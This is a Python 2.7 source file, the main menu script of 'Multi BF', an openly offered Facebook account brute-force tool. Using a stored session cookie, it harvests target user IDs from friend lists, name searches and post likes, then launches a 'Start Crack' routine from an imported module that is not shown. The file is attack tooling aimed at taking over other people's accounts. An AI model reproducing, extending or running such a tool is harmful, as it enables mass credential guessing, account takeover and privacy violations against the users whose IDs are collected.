#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : main.py                            #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, time
from app import config
from app import login
from app import crack
from src import friends_list
from src import friends
from src import search_name
from src import likes
from bs4 import BeautifulSoup as parser

class Brute(object):
	def __init__(self, url):
		self.url = url
		self.config = config.Config()
		self.cookie = self.config.loadCookie()
		self.menu = '\n'
		self.menu += '  [ \033[0;96m01\033[0m ]  Dump Id Friends lists\n'
		self.menu += '  [ \033[0;96m02\033[0m ]  Dump Id Friends\n'
		self.menu += '  [ \033[0;96m03\033[0m ]  Dump Id by Search name\n'
		self.menu += '  [ \033[0;96m04\033[0m ]  Dump Id from likes status\n'
		self.menu += '  [ \033[0;96m05\033[0m ]  Start Crack\n'
		self.menu += '  [ \033[0;96m00\033[0m ]  Remove cookies\n'
		if self.cookie == False:
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()

	def start(self):
		response = self.config.httpRequest(self.url+'/profile.php', self.cookie).encode('utf-8')
		if 'mbasic_logout_button' in str(response):
			self.main(response)
		else:
			os.remove('log/cookies.log')
			print('\n\033[0;91m[WARNING] Cookies invalids, please login again.\033[0m')
			raw_input('\n[ Press Enter]')
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()
			self.start()
			exit()

	def main(self, response):
		os.system('clear')
		print(self.config.banner())
		html = parser(response, 'html.parser')
		print('_________________________________________________________')
		print('\n(\033[0;96m•\033[0m) ACTIVE USER : '.decode('utf-8')+html.title.text.upper())
		print('_________________________________________________________')
		print(self.menu)
		try:
			choose = int(raw_input('Choose >> '))
		except ValueError:
			exit('\n\033[0;91mYou stuppid.\033[0m')
		if choose == 1:
			exit(friends_list.main(self, self.cookie, self.url, self.config))
		elif choose == 2:
			exit(friends.main(self, self.cookie, self.url, self.config))
		elif choose == 3:
			exit(search_name.main(self, self.cookie, self.url, self.config))
		elif choose == 4:
			exit(likes.main(self, self.cookie, self.url, self.config))
		elif choose == 5:
			exit(crack.Brute().main())
		elif choose == 0:
			ask = raw_input('\nAre you Sure? [y/N]: ')
			if ask.lower() == 'y':
				print('\nRemoving cookies...')
				time.sleep(2)
				os.remove('log/cookies.log')
				print('\n\033[0;92mSuccess removed!\033[0m')
				time.sleep(2)
				login.loginFb(self, self.url, self.config)
				self.cookie = self.config.loadCookie()
				self.start()
			else:
				self.cookie = self.config.loadCookie()
				print('\ncanceled!')
				self.start()
		else: exit('\n\033[0;91mYou stuppid.\033[0m')